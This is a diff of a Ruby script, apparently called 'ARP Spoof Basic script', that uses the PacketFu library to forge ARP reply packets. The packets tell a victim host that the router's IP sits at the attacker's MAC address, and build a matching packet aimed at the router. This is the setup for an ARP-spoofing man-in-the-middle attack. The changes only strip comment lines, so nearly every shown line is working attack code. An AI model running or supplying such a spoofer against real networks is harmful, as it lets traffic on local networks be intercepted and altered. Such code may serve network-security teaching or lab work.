@@ -1,7 +1,5 @@
 #!/usr/bin/env ruby
-#
-# ARP Spoof Basic script
-#
+
 require 'packetfu'
 
 attacker_mac = "02:42:C0:A8:5A:0C"
@@ -13,7 +11,6 @@ router_mac   = "02:42:C0:A8:5A:0D"
 info = PacketFu::Utils.whoami?
 
 # Victim
-#
 # Build Ethernet header
 arp_packet_victim = PacketFu::ARPPacket.new
 arp_packet_victim.eth_saddr = attacker_mac        # attacker MAC address
@@ -25,9 +22,7 @@ arp_packet_victim.arp_saddr_ip = router_ip        # the router's IP
 arp_packet_victim.arp_daddr_ip = victim_ip        # the victim's IP
 arp_packet_victim.arp_opcode = 2                  # arp code 2 == ARP reply
 
-#
 # Router
-#
 # Build Ethernet header
 arp_packet_router = PacketFu::ARPPacket.new
 arp_packet_router.eth_saddr = attacker_mac        # attacker MAC address
